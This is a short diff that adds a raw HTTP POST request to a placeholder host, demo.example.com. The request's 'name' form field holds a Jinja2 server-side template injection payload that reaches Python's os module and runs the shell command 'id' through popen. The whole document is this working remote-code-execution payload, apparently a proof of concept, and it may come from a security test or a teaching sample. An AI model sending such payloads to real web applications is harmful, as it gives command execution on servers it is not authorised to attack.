@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+Connection: close
+
+name={{namespace.__init__.__globals__.os.popen(&#39;id&#39;).read()}}
